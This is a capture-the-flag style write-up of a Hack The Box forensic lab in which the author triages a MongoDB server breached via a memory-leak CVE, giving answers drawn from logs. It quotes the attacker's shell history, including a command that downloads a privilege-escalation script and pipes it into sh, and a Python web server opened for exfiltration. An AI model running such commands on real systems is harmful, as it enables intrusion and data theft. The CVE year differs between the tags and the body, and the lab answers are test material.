---
title: "HTB-MangoBleed"
date: 2026-01-30
draft: false
tags:
  - DFIR
  - Log Analysis
  - Linux
  - CVE-2024-14847
  - mongodb
platform: DFIR
---

{{< infobox difficulty="Super Easy" os="Linux" date="2026-01-30" >}}

**Description:**  
You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

## <span style="color:red">initial analysis</span>
What we've got:
```
.
├── bodyfile
│   └── bodyfile.txt
├── hash_executables
│   ├── hash_executables.md5
│   └── hash_executables.sha1
├── live_response
│   ├── containers
│   ├── hardware
│   ├── network
│   ├── packages
│   ├── process
│   ├── storage
│   └── system
├── [root]
│   ├── etc
│   ├── home
│   ├── lib
│   ├── root
│   ├── run
│   ├── snap
│   ├── usr
│   └── var
└── system
    ├── getcap.txt
    ├── group_name_unknown_files.txt
    ├── hidden_directories.txt
    ├── hidden_files.txt
    ├── sgid.txt
    ├── suid.txt
    ├── user_name_unknown_files.txt
    ├── world_writable_directories.txt
    └── world_writable_files.txt
```

## CVE explain
**1. What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?**  
**CVE-2025-14847** allows unauthenticated attackers to leak sensitive heap memory by exploiting a trust issue in how MongoDB Server handles zlib-compressed network messages.  This memory can contain sensitive data such as cleartext credentials, API keys, session tokens and personally identifiable information (PII). an attacker only needs network access to the database's default tcp\27017 port to trigger it

This vulnerability affects the following MongoDB versions:  
Version 8.2: 8.2.0 – 8.2.2  
Version 8.0: 8.0.0 – 8.0.16  
Version 7.0: 7.0.0 – 7.0.27  
Version 6.0: 6.0.0 – 6.0.26  
Version 5.0: 5.0.0 – 5.0.31  
Version 4.4: 4.4.0 – 4.4.29  

## MongoDB version
**2. What is the version of MongoDB installed on the server that the CVE exploited?**
analysing logs i found a version of MongoDB
```
"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48...
```

## Atacker IP address
**3. Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.**
analysing logs i found the attacker's IP address:
```
"msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","isLoadBalanced":false,"uui...
```

## Malicious activity
**4. Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)**
exploitation activity began at `2025-12-29 05:25:52`, when a server recieve a connection from attacker's.
```
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","i
```

**5. Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.**
```bash
$ grep -c  "65.0.76.43" [root]/var/log/mongodb/mongod.log  
75260
```
### auth.log
**6. The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?**
at *2025-12-29 05:40:03*, the attacker successfully gain access. found in `auth.log`
```
2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
```
### malicious script
**7. Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.**
In `.bash_history` of mongoadmin user i found that attacker download a `linpeas.sh` script.
```bash
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /data
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
exit
```
### web server for exfiltration
**8. The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?**
the attacker in `/var/lib/mongodb` deploy a python web server